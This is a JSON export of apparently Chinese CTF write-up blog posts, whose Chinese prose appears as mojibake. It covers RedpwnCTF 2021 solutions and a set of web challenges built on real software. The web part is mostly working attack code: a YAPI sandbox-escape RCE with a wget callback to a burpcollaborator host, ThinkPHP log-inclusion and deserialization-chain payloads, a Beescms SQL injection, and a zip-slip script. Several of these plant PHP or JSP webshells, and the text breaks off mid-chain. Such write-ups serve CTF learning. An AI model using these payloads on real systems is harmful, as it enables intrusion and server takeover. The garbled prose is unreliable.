cookie.\nDownloads: mdbin.tar.gz\n å‚è€ƒï¼šwp1 wp2\nç›´æ¥æ”¾å‚è€ƒçš„wpé“¾æ¥å§ï¼Œè¿˜æ˜¯jsåŸå‹æ±¡æŸ“çš„é—®é¢˜ï¼Œä½†æ˜¯ç”±äºæˆ‘å¯¹jsåŸå‹æ±¡æŸ“è¿™ä¸ªé—®é¢˜äº†è§£çš„ä¸å¤Ÿæ·±å…¥ï¼Œä¹Ÿåªèƒ½ç…§çŒ«ç”»è™çš„å¤ç°ï¼Œè¿˜æœ‰å¾ˆå¤šèµ„æ–™éœ€è¦é¢å¤–çš„å»è¡¥å……åœ°çœ‹ï¼Œå°±ä¸ç­é—¨å¼„æ–§äº†ï¼Œä¸Šé¢çš„ä¸¤ä¸ªé“¾æ¥é‡Œå†™çš„éƒ½å¾ˆå¥½ï¼\n***web/lazy-admin  Looks like another service with no functionality. I hope the admin is doing their job\u0026hellip;\nlazy-admin.mc.ax\nDownloads: lazy-admin.tar.gz\n å‚è€ƒï¼šwp\néš¾ï¼Œæˆ‘ä¸æ‡‚\nmisc/sanity-check  I get to write the sanity check challenge! Alright!\nflag{1_l0v3_54n17y_ch3ck_ch4ll5}\n misc/discord  Join the discord! I hear #rules is an incredibly engaging read.\n misc/compliant-lattice-feline  get a flag! nc mc.ax 31443\n *misc/the-substitution-game  nc mc.ax 31996\nDownloads: chall.py\n Markov Algorithmç½¢äº†\nå‚è§ï¼šMarkov Algorithm Online\nmisc/annaBEL-lee  sounds from a kingdom by the sea\nThe server does not produce any visible output; please take a close look at what it is sending before asking if the server is broken.\nWhat exactly is the server sending? Sometimes it makes a sound, sometimes it doesn\u0026rsquo;t. Plotting it on a chart might help you see something.\nIt might be helpful to turn your sound on, but you\u0026rsquo;ll probably want to write all of it down since your terminal might not catch everything fast enoughâ€”maybe slow it down to get a better idea.\nThis is not audio steganography. Apologies if anyone went down that route.\nnc mc.ax 31845\n ncè¿å…¥åæ²¡æœ‰ä»»ä½•å¯è§†çš„å›æ˜¾ï¼Œä½†æ˜¯è—åœ¨äº†å£°éŸ³ä¿¡æ¯é‡Œ\n\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00 å¯¼å‡ºï¼Œæœ‰ä¸¤ç§å€¼ï¼šno bell(\\x00) bell(\\x07)ï¼Œè½¬åŒ–ä¸º0ä¸1\n101110101000100011100011100010001011101000101010000000101110101000111011101110001011101110001000101110100011101110101011101110000000111010111010001010101000101110001110100011101110100010000000101110111010001011100010111010001000111010001010100000001110001110111011100000001110101110100010101110001011101000101110101000111010111011100011101110111010101000000010101110100010111010100010111000111011101000111010111011101000111010100010111011101110111000111010001110111010001110101010101110001110101000111011101110111011100011101000111011101110111010001110101010101110001110111010001110111011101110111000100010101000111010101010111000111000101010100010101011101110001110101010101110001011100011101000111010001011100011101010101011100011101010100010101011101110001011101010001110101110111010111000 æ”¹ä¸ºè«æ–¯ç”µç çš„æ ·å­\n.-.. . - - . .-. ... | .-.. --- .-- . .-. --..-- | -.-. .... .- -. --. . | .--. .- .-. . -. ... | - --- | -.-. ..- .-. .-.. -.-- ---... | ..-. .-.. .- --. -.--. -.. .---- -. --. -....- -.. ----- -. ----. -....- --. ----- . ... -....- - .... ...-- -....- .- -. -. .- -....- -... ...-- .-.. -.--.- è§£å¯†\nLETTERS LOWER, CHANGE PARENS TO CURLY: FLAG(D1NG-D0N9-G0ES-TH3-ANNA-B3L) flag{d1ng-d0n9-g0es-th3-anna-b3l}\ncrypto/scissor  I was given this string and told something about scissors. egddagzp_ftue_rxms_iuft_rxms_radymf\nDownloads: encrypt.py\n crypto/baby  I want to do an RSA!\nDownloads: output.txt\n n: 228430203128652625114739053365339856393 e: 65537 c: 126721104148692049427127809839057445790 ä¸€ç‚¹éƒ½ä¸ä¼šcryptoâ€¦â€¦ å…¶å®æŸ¥ä¸€ä¸‹RSA n e cå…¶å®å°±èƒ½åšå‡ºæ¥åé¢çš„ä¸œè¥¿äº†\nRSA decryption using only n e and c ç„¶åå°±ä¼šçŸ¥é“è¿™ä¸ªä¸œè¥¿ Ganapati/RsaCtfToolï¼Œæˆ–è€…è¿™ä¸ªåœ¨çº¿ç½‘ç«™ RSA Cipher\nä¸ºäº†decodeé¦–å…ˆéœ€è¦æ ¹æ®Næ±‚å‡ºä¸¤ä¸ªäº’è´¨çš„på’Œqï¼Œå¯ä»¥ç”¨è¿™ä¸ªç½‘ç«™æ¥åš æ•´æ•°åˆ†è§£å·¥å…·\nä¹‹åå°±å¯ä»¥æ„‰å¿«çš„è§£å¯†äº†ï¼\nrev/wstrings  Some strings are wider than normal\u0026hellip;\nDownloads: wstrings\n flag{n0t_al1_str1ngs_ar3_sk1nny}\nrev/bread-making  My parents aren\u0026rsquo;t home! Quick, help me make some bread please\u0026hellip; nc mc.ax 31796\nDownloads: bread\n å‚è€ƒï¼šwp2 wp3 wp4\næˆ‘å½“æ—¶çš„æ€è·¯å’Œæƒ³æ³•å¤§è‡´è¿˜æ˜¯å¯¹çš„ï¼Œ~~ï¼ˆè™½ç„¶æ²¡æœ‰åšå‡ºæ¥å§ï¼‰~~è¿™ä¸ªå°±æ˜¯å…ˆæå–å‡ºæ–‡ä»¶ä¸­çš„å­—ç¬¦ä¸²éƒ¨åˆ†ï¼Œç„¶åç”¨é€»è¾‘ åœ¨äº¤äº’æ¨¡å¼ä¸‹ç”¨æ­£ç¡®çš„é¡ºåºè¾“å…¥ å®Œæ•´çš„é¡ºä¸‹æ¥è¿™ä¸ªæµç¨‹ï¼Œæœ€åæ‹¿åˆ°flagï¼Œæœ€åçš„æ­£ç¡®é¡ºåºæ˜¯è¿™æ ·çš„\nadd ingredients to the bowl add flour add yeast add salt add water hide the bowl inside a box wait 3 hours work in the basement preheat the toaster oven set a timer on your phone watch the bread bake pull the tray out with a towel unplug the fire alarm open the window unplug the oven clean the counters flush the bread down the toilet wash the sink get ready to sleep close the window replace the fire alarm brush teeth and go to bed The flag is: flag{m4yb3_try_f0ccac1a_n3xt_t1m3???0r_dont_b4k3_br3ad_at_m1dnight}\nè°ƒè¯•çš„è¿‡ç¨‹æ˜¯linuxä¸‹çš„pyè„šæœ¬\nfrom pwn import * p = remote(\u0026quot;mc.ax\u0026quot;, 31796) p.sendlineafter(\u0026quot;bowl\u0026quot;, \u0026quot;add flour\u0026quot;) p.sendlineafter(\u0026quot;flour has been added\u0026quot;, \u0026quot;add yeast\u0026quot;) p.sendlineafter(\u0026quot;yeast has been added\u0026quot;, \u0026quot;add salt\u0026quot;) p.sendlineafter(\u0026quot;salt has been added\u0026quot;, \u0026quot;add water\u0026quot;) p.sendlineafter(\u0026quot;lumpy dough\u0026quot;, \u0026quot;hide the bowl inside a box\u0026quot;) p.sendlineafter(\u0026quot;to rise\u0026quot;, \u0026quot;wait 3 hours\u0026quot;) p.sendlineafter(\u0026quot;finish the dough\u0026quot;, \u0026quot;work in the basement\u0026quot;) p.sendlineafter(\u0026quot;needs to be baked\u0026quot;, \u0026quot;preheat the toaster oven\u0026quot;) p.sendlineafter(\u0026quot;for 45 minutes\u0026quot;, \u0026quot;set a timer on your phone\u0026quot;) p.sendlineafter(\u0026quot;awfully long time\u0026quot;, \u0026quot;watch the bread bake\u0026quot;) p.sendlineafter(\u0026quot;no time to waste\u0026quot;, \u0026quot;pull the tray out with a towel\u0026quot;) p.sendlineafter(\u0026quot;smoke in the air\u0026quot;, \u0026quot;unplug the fire alarm\u0026quot;) p.sendlineafter(\u0026quot;in another room\u0026quot;, \u0026quot;open the window\u0026quot;) p.sendlineafter(\u0026quot;air rushes in\u0026quot;, \u0026quot;unplug the oven\u0026quot;) p.sendlineafter(\u0026quot;kitchen is a mess\u0026quot;, \u0026quot;wash the sink\u0026quot;) p.sendlineafter(\u0026quot;sink is cleaned\u0026quot;, \u0026quot;clean the counters\u0026quot;) p.sendlineafter(\u0026quot;counters are cleaned\u0026quot;, \u0026quot;flush the bread down the toilet\u0026quot;) p.sendlineafter(\u0026quot;is disposed of\u0026quot;, \u0026quot;get ready to sleep\u0026quot;) p.sendlineafter(\u0026quot;go to sleep\u0026quot;, \u0026quot;close the window\u0026quot;) p.sendlineafter(\u0026quot;window is closed\u0026quot;, \u0026quot;replace the fire alarm\u0026quot;) p.sendlineafter(\u0026quot;alarm is replaced\u0026quot;, \u0026quot;brush teeth and go to bed\u0026quot;) p.interactive() p.close() è¿™ä¸ªè„šæœ¬çš„é€»è¾‘æ˜¯é€šè¿‡breadæ–‡ä»¶å¯¼å‡ºçš„æ–‡æœ¬ï¼Œæ‰¾å‡ºæœ€ç¬¦åˆé€»è¾‘çš„ä¸Šä¸‹æ–‡ ç„¶ååˆ©ç”¨sendlineaferæ¥è§£é¢˜ï¼›å®é™…åšé¢˜çš„è¯ä¸å¯èƒ½åªé æ‰“å­—æ¥è¯•è¿™ä¸ªé¡ºåº ä¸æ˜¯è¯´è¯•è¿™ä¸ªæµªè´¹æ—¶é—´ è€Œæ˜¯ç­‰å¾…çš„æ—¶é—´éå¸¸éå¸¸çŸ­æš‚ æ²¡æœ‰å®Œæ•´æ‰“å®Œå­—çš„æ—¶é—´\nåè®° è¿™æ¬¡çš„redpwnæœ‰47é“é¢˜ï¼Œå„ä¸ªæ–¹å‘éƒ½æœ‰é€‚åˆæˆ‘è¿™ç§ç­¾åˆ°é€‰æ‰‹çš„ç®€å•é¢˜ï¼Œå¥½è¯„~\nå°±æ˜¯æ‰“æ˜Ÿå·çš„é¢˜æ¶‰åŠåˆ°çš„jsåŸå‹æ±¡æŸ“é—®é¢˜ï¼Œå…‰é è¿™ä¸€ä¸¤ä¸ªé¢˜æä¸å¤ªæ‡‚ï¼Œä½†æ˜¯æœ€è¿‘çš„ååºåˆ—åŒ–é—®é¢˜è¿˜æ²¡æ€»ç»“å®Œï¼Œä¸‰å¿ƒäºŒæ„çš„ä¹Ÿä¸å¤ªå¥½ï¼Œä½†æ˜¯ä¹‹åä¸€å®šä¼šå›æ¥çœ‹çš„ï¼ï¼ï¼ç­‰ç€è¢«é­å°¸å§ å“¼\n","date":"2021-08-08T20:08:39+08:00","permalink":"https://amiaaaz.github.io/2021/08/08/redpwn2021-wp/","section":"posts","tags":["wp"],"title":"RedpwnCTF2021 Wp"},{"categories":["CTF"],"contents":"cat flag  ç®€ç®€å•å•cat flag\nHint: ç®¡ç†å‘˜æ›¾è®¿é—®è¿‡flag\n \u0026lt;?php if (isset($_GET[\u0026#39;cmd\u0026#39;])) { $cmd = $_GET[\u0026#39;cmd\u0026#39;]; if (!preg_match(\u0026#39;/flag/i\u0026#39;,$cmd)) { $cmd = escapeshellarg($cmd); system(\u0026#39;cat \u0026#39; . $cmd); } } else { highlight_file(__FILE__); } ?\u0026gt;æç¤ºç®¡ç†å‘˜è®¿é—®è¿‡ï¼Œå…ˆcat /var/log/nginx/access.log\nä¹‹åç”¨%faç»•è¿‡ /?cmd=this_is_final_fl%faag_e2a457126032b42d.php\nreview - Nginx é‡è¦æ–‡ä»¶ç›®å½•ï¼š\n é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š/etc/nginx ä¸»è¦é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf/nginx.conf ç®¡ç†è„šæœ¬ï¼š/usr/lib64/systemd/system/nginx.service æ¨¡å—ï¼š/usr/lisb64/nginx/modules åº”ç”¨ç¨‹åºï¼š/usr/sbin/nginx ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š/usr/share/nginx/html æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/nginx/access.log  ezrce  ä½ çœŸçš„ä¼š nodejs å—ï¼Ÿ\n æ˜¯ä¸€ä¸ªYAPIçš„ä¸»é¡µï¼Œæ ¹æ®é¢˜ç›®é‡Œrceçš„æç¤º æœæœçœ‹å·²çŸ¥çš„æ¼æ´ï¼šYapi å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´\né‚£å°±å¥½åŠäº† è·Ÿç€æ¥å°±è¡Œå’¯ï¼›é¦–å…ˆåˆ›å»ºä¸€ä¸ªé¡¹ç›®\nä¹‹åä¿®æ”¹å…¨å±€mockè„šæœ¬\nconst sandbox = this const ObjectConstructor = this.constructor const FunctionConstructor = ObjectConstructor.constructor const myfun = FunctionConstructor(\u0026#39;return process\u0026#39;) const process = myfun() mockjson = process.mainModule.require(\u0026#34;child_process\u0026#34;).execSync(\u0026#34;command\u0026#34;).toString() ä¹‹åæ·»åŠ æ¥å£\nè„šæœ¬ä¸­çš„execSync()å¤„å¯rceï¼Œå…ˆç”¨wget http://xxxxx.burpcollaborator.netè¯•è¯•æ°´\nå¾ˆé¡ºåˆ©å˜› å¥½è€¶ï¼\ncat `ls`\t// spawnSync /bin/sh ENOBUFS cat `cd ../;ls`\t// config.json, init.lock, log, vendors cat `cd ../../;ls`\t// app, bin, boot, dev, etc, ffffffflllllaggggg, home, lib, lib64, media, mnt, opt, proc, root, run, sbin, srv, start.sh, tmp, usr, var cd ../../;cat `ls`\t// app, bin,boot, dev, etc, home, lib, lib64, media, mnt,opt, proc, root, run, sbin, srv, sys, tmp, usr, var cat `cd ../../;cat ffffffflllllaggggg`\t// flag{5d096f4f-8c32-49b6-bed4-b485eb1cf08b} easythinkphp  easythinkphp\n åªæœ‰ä¸€ä¸ªthinkphp 3.2.3çš„æ¬¢è¿é¡µé¢ï¼Œtpçš„æ´å¾ˆå¤š å¯ä»¥ç›´æ¥æ‹¿æ¥æ‰“ï¼Œå‚è€ƒï¼šã€æ¼æ´é€šæŠ¥ã€‘ThinkPHP3.2.x RCEæ¼æ´é€šæŠ¥\n/index.php?m=--\u0026gt;\u0026lt;?=phpinfo();?\u0026gt; /index.php?m=Home\u0026amp;c=Index\u0026amp;a=index\u0026amp;value[_filename]=./Application/Runtime/Logs/Common/21_08_01.log å…ˆéªŒè¯ä¸€ä¸‹æ–‡æ¡£ä¸­çš„æ–¹æ³•ï¼ŒæˆåŠŸï¼Œä¹‹åæŠŠphpinfoæ¢æˆè‡ªå·±çš„ä¸€å¥è¯æœ¨é©¬\n/index.php?m=--\u0026gt;\u0026lt;?=eval($_POST['wuhu']);?\u0026gt; ä¼ å…¥å ç”¨èšå‰‘è¿æ¥å°±èƒ½æ‹¿flagäº†~\næˆ–è€…ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ThinkphpGUIä¸€æŠŠæ¢­ï¼ä¸€é”®getshell ä½ å€¼å¾—æ‹¥æœ‰\njspxcms ä¹Ÿæœ‰ç°æˆçš„æ´å¯ä»¥ç›´æ¥ç”¨ï¼Œå‚è€ƒï¼šå¤ç°jspxcmsè§£å‹getshellæ¼æ´ | ä»£ç å®¡è®¡| Jspxcmsæ–‡ä»¶ä¸Šä¼ æ¼æ´(CNVD-2019-40540) | è®°ä¸€æ¬¡ç”±è¿½è¸ªæº¯æºå‘ç°çš„â€œä¸å®‰å…¨è§£å‹getshellâ€\né¦–å…ˆæ„é€ å«jspğŸçš„æ¶æ„waråŒ…ï¼ŒğŸé•¿è¿™æ ·\n\u0026lt;% if(\u0026quot;023\u0026quot;.equals(request.getParameter(\u0026quot;pwd\u0026quot;))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\u0026quot;wuhu\u0026quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\u0026quot;\u0026lt;pre\u0026gt;\u0026quot;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\u0026quot;\u0026lt;/pre\u0026gt;\u0026quot;); } %\u0026gt; ä¹‹åæ”¾å…¥ä¸€ä¸ªè§£å‹åä¼šè‡ªåŠ¨å®Œæˆç›®å½•ç©¿è¶Šçš„zipåŒ…ä¸­ è¿™ä¸ªè¿‡ç¨‹ç”±pyè„šæœ¬å®Œæˆ\nimport zipfile if __name__ == \u0026#34;__main__\u0026#34;: try: binary = b\u0026#39;\u0026lt;script\u0026gt;alert(\u0026#34;helloworld\u0026#34;)\u0026lt;/script\u0026gt;\u0026#39; zipFile = zipfile.ZipFile(\u0026#34;test123.zip\u0026#34;, \u0026#34;a\u0026#34;, zipfile.ZIP_DEFLATED) info = zipfile.ZipInfo(\u0026#34;test123.zip\u0026#34;) zipFile.writestr(\u0026#34;../../../../dog123.html\u0026#34;, binary) zipFile.close() except IOError as e: raise e import zipfile z = zipfile.ZipFile(\u0026#39;test123.zip\u0026#39;, \u0026#39;a\u0026#39;, zipfile.ZIP_DEFLATED) with open(\u0026#39;wuhu.war\u0026#39;, \u0026#39;rb\u0026#39;)as f: temp = f.read() z.writestr(\u0026#39;../../../../wuhu.war\u0026#39;, temp) z.close() éœ€è¦æ³¨æ„çš„æ˜¯ æœ€ç»ˆæˆ‘ä»¬è¦ç©¿è¶Šåˆ°çš„ç›®å½•æ˜¯ç½‘ç«™æ ¹ç›®å½•çš„ä¸Šå±‚ï¼Œå³webappsç›®å½•ä¸‹ ä¸ROOTç›®å½•åŒçº§ï¼Œå½“waråŒ…ä½äºè¿™ä¸ªç›®å½•ä¸‹æ‰ä¼šè‡ªåŠ¨éƒ¨ç½²\nç›´æ¥cat /flagå°±å¥½å•¦\ncybercms  èµ›åšCMSï¼Œåªä¸ºå®‰å…¨è€Œç”Ÿ\nHintï¼šä¿¡æ¯æœé›†æ˜¯ä¸€ä¸ªwebæ‰‹å¿…å¤‡çš„æŠ€èƒ½\n ä¸€ä¸ªï¼ˆä¼ªï¼‰cmså¹³å°ä»‹ç»çš„é¡µé¢ï¼Œæ¯”è¾ƒç®€é™‹ï¼Œé¦–é¡µ/åº”ç”¨æ¡ˆä¾‹å¤„æ˜¾ç¤ºhacked by ymnhï¼Œåœ¨ymnhçš„å’¨è¯¢é¡µé¢å¤„æœ‰è¿™æ ·çš„æŠ¥é”™\nåœ¨é¦–é¡µ/æ–°é—»åŠ¨æ€å¤„ï¼Œå‡ ä¹æ‰€æœ‰çš„å¸–å­éƒ½æ˜¯hacked by xxx~~ï¼ˆæœ¬æ¥æˆ‘è¿˜ä»¥ä¸ºæ˜¯å¤šä¹ˆå¤æ‚çš„é•¿ç¯‡å¤§è®ºï¼‰~~ï¼Œåœ¨å¦‚ä½•å®‰è£…å’Œä½¿ç”¨æ¨¡æ¿è¿™ç¯‡ä¸‹æœ‰æ²¡åˆ å¹²å‡€çš„ä¸œè¥¿\nå¦‚ä½•è®¾ç½®è¿›ç«™è¯­è¨€è¿™ç¯‡é‡Œç«Ÿç„¶æ˜¯è¿™æ ·çš„è‰ çœŸæ˜¯èšŒåŸ ä½äº† å›¾ç©·åŒ•è§äº†å±äºæ˜¯2333333\næ ¹æ®è¿™äº›ï¼Œå¯ä»¥å¾—çŸ¥æ•´ä¸ªç«™æ˜¯å®Œå…¨ç§»æ¤/å¥—å£³beescmsçš„ æ‰€ä»¥æ¥ç€å»æ‰¾å·²å­˜åœ¨çš„æ´ï¼Œå‚è€ƒï¼šBeescms_v4.0 sqlæ³¨å…¥æ¼æ´åˆ†æ\nåœ¨adminååŠ å•å¼•å·ï¼Œæç¤ºè¡¨åæ˜¯bees_adminï¼Œæœ‰id, admin_name, admin_password, admin_purview, is_disableå…±5ä¸ªå­—æ®µ\nç®€å•fuzzå¯çŸ¥ï¼šè¿‡æ»¤äº†ç©ºæ ¼ï¼ˆç”¨/**/ç»•è¿‡ï¼‰ï¼ˆæˆ–è€…ç”¨tabç»•è¿‡ æˆ–è€…%0aç»•è¿‡ éƒ½å¯ä»¥ï¼‰ï¼Œè¿‡æ»¤äº†select, outfileï¼ˆåŒå†™ç»•è¿‡ï¼‰ï¼Œå¯¹å°–æ‹¬å·è½¬ä¹‰ä¸ºhtmlå®ä½“ï¼ˆç”¨hexç»•è¿‡ï¼‰\nuser=admin'/**/union/**/selselectect/**/1,2,3,4,5# å›æ˜¾æ­£å¸¸ï¼Œæ¥ç€å°è¯•å†™å…¥shellï¼ˆè¿™é‡Œè¦å†™æ¸…æ¥šç»å¯¹è·¯å¾„ï¼Œåœ¨ä¸Šé¢çš„ä¸€å¼ æŠ¥é”™çš„é¡µé¢ä¹Ÿæœ‰æ‰€æç¤ºäº†ï¼‰\nadmin'/**/union/**/selselectect/**/1,2,3,4,0x3c3f3d6576616c28245f504f53545b2777756875275d293b3f3e/**/into/**/ououtfiletfile/**/'/var/www/html/wuhu.php'# å¥½è€¶ï¼Œè¿èšå‰‘æ‹¿flagå’¯\nez_website  ç®€å•çš„é¢˜ç›®\n ä¹Ÿæ˜¯ç°å®ä¸–ç•Œå­˜åœ¨çš„ä¸œè¥¿ï¼Œå‚è€ƒï¼šé½åšå»ºç«™ç³»ç»Ÿx1.0ä»£ç å®¡è®¡\nç›´æ¥ç”¨å·²æœ‰çš„é“¾å­æ‰“\n\u0026lt;?php namespace think\\process\\pipes { class Windows { private $files = []; public function __construct($files) { $this-\u0026gt;files = [$files]; //$file =\u0026gt; /think/Modelçš„å­ç±»new Pivot(); Modelæ˜¯æŠ½è±¡ç±»  } } } namespace think { abstract class Model{ protected $append = []; protected $error = null; public $parent; function __construct($output, $modelRelation) { $this-\u0026gt;parent = $output; //$this-\u0026gt;parent=\u0026gt; think\\console\\Output;  $this-\u0026gt;append = array(\u0026#34;xxx\u0026#34;=\u0026gt;\u0026#34;getError\u0026#34;); //è°ƒç”¨getError è¿”å›this-\u0026gt;error  $this-\u0026gt;error = $modelRelation; // $this-\u0026gt;error è¦ä¸º relationç±»çš„å­ç±»ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯OnetoOneç±»çš„å­ç±»==\u0026gt;\u0026gt;HasOne  } } } namespace think\\model{ use think\\Model; class Pivot extends Model{ function __construct($output, $modelRelation) { parent::__construct($output, $modelRelation); } } } namespace think\\model\\relation{ class HasOne extends OneToOne { } } namespace think\\model\\relation { abstract class OneToOne { protected $selfRelation; protected $bindAttr = []; protected $query; function __construct($query) { $this-\u0026gt;selfRelation = 0; $this-\u0026gt;query = $query; //$queryæŒ‡å‘Query  $this-\u0026gt;bindAttr = [\u0026#39;xxx\u0026#39;];// $valueå€¼ï¼Œä½œä¸ºcallå‡½æ•°å¼•ç”¨çš„ç¬¬äºŒå˜é‡  } } } namespace think\\db { class Query { protected $model; function __construct($model) { $this-\u0026gt;model = $model; //$this-\u0026gt;model=\u0026gt; think\\console\\Output;  } } } namespace think\\console{ class Output{ private $handle; protected $styles; function __construct($handle) { $this-\u0026gt;styles = [\u0026#39;getAttr\u0026#39;]; $this-\u0026gt;handle =$handle; //$handle-\u0026gt;think\\session\\driver\\Memcached  } } } namespace think\\session\\driver { class Memcached { protected $handler; function __construct($handle) { $this-\u0026gt;handler = $handle; //$handle-\u0026gt;think\\cache\\driver\\File  } } } namespace think\\cache\\driver { class File { protected $options=null; protected $tag; function __construct(){ $this-\u0026gt;options=[ \u0026#39;expire\u0026#39; =\u0026gt; 3600, \u0026#39;cache_subdir\u0026#39; =\u0026gt; false, \u0026#39;prefix\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;path\u0026#39; =\u0026gt; \u0026#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../runtime/temp/a.php\u0026#39;, \u0026#39;data_compress\u0026#39; =\u0026gt; false, ]; $this-\u0026gt;tag = \u0026#39;xxx\u0026#39;; } } } namespace { $Memcached = new think\\session\\driver\\Memcached(new \\think\\cache\\driver\\File()); $Output = new think\\console\\Output($Memcached); $model = new think\\db\\Query($Output); 